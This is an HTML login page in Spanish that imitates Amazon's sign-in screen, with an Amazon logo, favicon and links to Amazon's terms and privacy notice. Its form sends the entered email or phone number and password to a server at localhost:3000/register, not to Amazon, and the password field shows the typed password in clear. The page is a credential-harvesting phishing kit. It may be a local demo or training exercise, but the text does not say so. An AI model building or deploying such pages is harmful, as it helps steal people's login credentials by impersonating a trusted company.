<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <link rel="icon" href="images/Amazon.ico" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    
    <div class="logo-container">
        <img src="images/amazon2.png" alt="Logo Amazon">
    </div>
    <div class="login-container">
        <form action="http://localhost:3000/register" method="POST">
            <h2>Iniciar sesión</h2>
            <div class="input-group">
                <label for="email">Dirección de email o número de teléfono móvil</label>
                <input type="text" id="email" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="text" id="password" name="password" required>
            </div>
            <button type="submit">Continuar</button>
            <div class="info-text">
                Al continuar, aceptas las 
                <a href="cond_uso.html">Condiciones de uso</a> y el 
                <a href="privacidad.html">Aviso de privacidad</a> de Amazon.
            </div>
            <div class="help">
                <a href="#">¿Necesitas ayuda?</a>
            </div>
        </form>
        
        <footer>
            <div class="new-account">
                <label class="info-text">¿Eres nuevo en Amazon?</label>
                <a href="#" class="create-account">Crear tu cuenta en Amazon</a>
            </div>
        </footer>
    </div>
</body>
</html>
